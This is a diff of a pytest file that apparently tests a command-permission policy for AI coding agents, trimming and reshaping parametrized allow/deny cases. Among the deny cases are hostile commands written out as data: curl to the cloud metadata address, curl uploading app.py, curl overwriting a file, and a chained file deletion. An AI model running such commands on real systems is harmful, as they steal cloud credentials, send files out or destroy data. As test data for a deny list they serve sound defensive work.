@@ -200,8 +200,6 @@ def test_codex_dontask_turns_ask_into_deny(db, ws, monkeypatch):
 
 @pytest.mark.parametrize("match_type,decision,command", [
     ("prefix", "ask", "echo ok && deploy prod > out"),
-    ("exact", "ask", "deploy prod > out"),
-    ("exact", "deny", "echo ok && deploy prod > out"),
     pytest.param("exact", "ask", "echo ok && deploy prod > out", marks=pytest.mark.variant("compound exact ask bypass")),
     pytest.param("exact", "deny", "deploy prod > out", marks=pytest.mark.variant("direct exact deny bypass")),
     ("exact", "ask", "deploy prod >"),
@@ -627,8 +625,9 @@ def launch_argv(ws, mode=None, env=None):
     return Codex().command(LaunchContext("c1", profile, None, cwd=ws.path, mode=mode))
 
 
-@pytest.mark.parametrize("mode", [None, "review"])
-@pytest.mark.parametrize("profile_path, base", [(None, "/usr/bin"), ("/opt/bin", "/opt/bin"), ("", "")])
+@pytest.mark.parametrize("mode, profile_path, base", [
+    (None, None, "/usr/bin"), (None, "/opt/bin", "/opt/bin"), (None, "", ""), ("review", None, "/usr/bin"),
+])
 def test_codex_launch_venv_path(ws, monkeypatch, mode, profile_path, base):
     """uv panics under Codex's macOS sandbox, so the worktree's .venv/bin leads
     PATH for `python -m pytest`, on top of the profile's PATH when it sets one
@@ -1429,7 +1428,6 @@ REVIEWER_COMMANDS = [
     ("git -C {ws} log -n 15 --oneline", "allow"),
     pytest.param("grep -n feature app.py && head -n 5 app.py | tail -n 2", "allow",
                  marks=pytest.mark.variant("#262: ordinary allowed read chains already work on baseline")),
-    ('git show main:app.py && echo "=== B ===" && git diff --stat', "allow"),
     pytest.param("curl -q -sS http://169.254.169.254/latest/meta-data/", "deny", id="curl_readonly_hosts-metadata",
                  marks=pytest.mark.variant("review F2: cloud metadata over plain http")),
     pytest.param("curl -q -L http://127.0.0.1:8080/x", "deny", id="curl_readonly_hosts-loopback_redirect",
@@ -1440,7 +1438,6 @@ REVIEWER_COMMANDS = [
     ("curl https://example.com", "deny"),
     pytest.param("curl -s -q https://example.com", "deny", marks=pytest.mark.variant("misplaced -q still loads curlrc")),
     ("git status; rm app.py", "deny"),
-    ("curl -q -d payload https://example.com", "deny"),
     pytest.param("curl -q -T app.py https://example.com", "deny", marks=pytest.mark.variant("curl upload bypass")),
     pytest.param("curl -q -o app.py https://example.com", "deny", marks=pytest.mark.variant("curl output file bypass")),
     pytest.param("git -C /outside log", "deny", marks=pytest.mark.variant("git outside the workspace")),
